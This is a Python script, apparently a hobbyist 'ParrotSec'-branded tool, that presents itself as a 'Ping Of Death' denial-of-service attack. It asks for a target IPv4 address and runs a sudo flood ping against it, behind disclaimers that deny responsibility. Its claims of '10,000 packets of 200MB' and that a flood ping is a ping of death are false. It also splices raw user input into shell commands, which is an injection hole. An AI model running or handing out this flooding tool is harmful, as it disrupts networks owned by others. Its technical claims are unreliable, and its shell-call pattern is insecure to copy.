#ping of death using ping in python3 


import os 
import sys 
import time
import colorama 
from colorama import Fore, Back, Style

os.system(' clear ')
print(" [!] starting Ping Of Death ")
time.sleep(2)
os.system(' clear ')
print(" NOTE: THIS IS A DOS ATTACK THAT FLOODS ROUTER ")
print(" 4-6 AND COMMITS FLOOD ATTACKS FOR IPV4-6...")
print(" INTERNTE PROTOCALS, USE THIS WISELY USING ")
print(" THE GIVEN COMMAND IT WILL FLOOD WITH 10,000")
print(" PACKETS OF 200MB THIS WILL TAKE UP ALOT OF INTERNET")
print(" MAKE SURE YOU HAVE THE PROPER STORAGE AND SPACE ")
print(" I Am NOT RESPONSIBLE FOR ANY DAMAGE THAT THIS CAUSES ")
print(" =====================================================")
print(" script will start in 15 seconds ")
time.sleep(15)
os.system(' clear ')
print(Fore.RED+"|===============================================|")
print(Fore.RED+"| ____                      _   ____            |")
print(Fore.RED+"||  _ \ __ _ _ __ _ __ ___ | |_/ ___|  ___  ___ |")
print(Fore.RED+"|| |_) / _` | '__| '__/ _ \| __\___ \ / _ \/ __||")
print(Fore.RED+"||  __/ (_| | |  | | | (_) | |_ ___) |  __/ (__ |")
print(Fore.RED+"||_|   \__,_|_|  |_|  \___/ \__|____/ \___|\___||")
print(Fore.RED+"|===============================================|")
print(Fore.RED+"| [1] check your connection                     |")
print(Fore.RED+"| [2] POD == Ping Of Death                      |")
print(Fore.RED+"|===============================================|")
A = str(input(" Option ==> "))

if '1' in A:
       os.system(' clear ')
       print(" [!] whats your home net IPv4? ")
       PV = str(input(" ==>> "))
       os.system(f' ping {PV} ')

if '2' in A:
       os.system(' clear ')
       print(" [!] are you sure you want to do this? ")
       NY = str(input(" Y/n ==> "))
       
       if 'Y' in NY:
              os.system(' clear ')
              IP = str(input(" [!] IPV4 ==>> "))
              time.sleep(1)
              os.system(' clear ')
              print(" [!] you have 15 seconds to controlc ")
              print(" [!] and cancel this attack if you do ")
              print(" [!] not cancel attack will continue  ")
              print(" [!] once this attack launches you will ")
              print(" [!] be fully reliable for anything that ")
              print(" [!] happens to you or your target for more ")
              print(" [!] info read apache 2.0 and MIT license ")
              print(" =========================================")
              time.sleep(17)
              os.system(' clear ')
              os.system(f' sudo ping -f {IP} ')      

       elif 'Yes' in NY:
                  os.system(' clear ')
                  IP = str(input(" [!] IPV4 ==>> "))
                  time.sleep(1)
                  os.system(' clear ')
                  print(" [!] you have 15 seconds to controlc ")
                  print(" [!] and cancel this attack if you do ")
                  print(" [!] not cancel attack will continue  ")
                  print(" [!] once this attack launches you will ")
                  print(" [!] be fully reliable for anything that ")
                  print(" [!] happens to you or your target for more ")
                  print(" [!] info read apache 2.0 and MIT license ")
                  print(" =========================================")
                  time.sleep(17)
                  os.system(' clear ')
                  os.system(f' sudo ping -f {IP} ')


       elif 'yes' in NY:
                  os.system(' clear ')
                  IP = str(input(" [!] IPV4 ==>> "))
                  time.sleep(1)
                  os.system(' clear ')
                  print(" [!] you have 15 seconds to controlc ")
                  print(" [!] and cancel this attack if you do ")
                  print(" [!] not cancel attack will continue  ")
                  print(" [!] once this attack launches you will ")
                  print(" [!] be fully reliable for anything that ")
                  print(" [!] happens to you or your target for more ")
                  print(" [!] info read apache 2.0 and MIT license ")
                  print(" =========================================")
                  time.sleep(17)
                  os.system(' clear ')
                  os.system(f' sudo ping -f {IP} ')
       
       elif 'No' in NY:
                 os.system(' clear ')
                 print(" EXITING SCRIPT [!] ")
                 time.sleep(1)
                 sys.exit()

       elif 'no' in NY:
                 os.system(' clear ')
                 print(" [!] have a nice one ")
                 print(" [-] exiting script...")
                 time.sleep(1)
                 os.system(' clear ')
                 sys.exit()


       elif 'n' in NY:
                os.system(' clear ')
                print(" [!] have a nice one ")
                sys.exit()
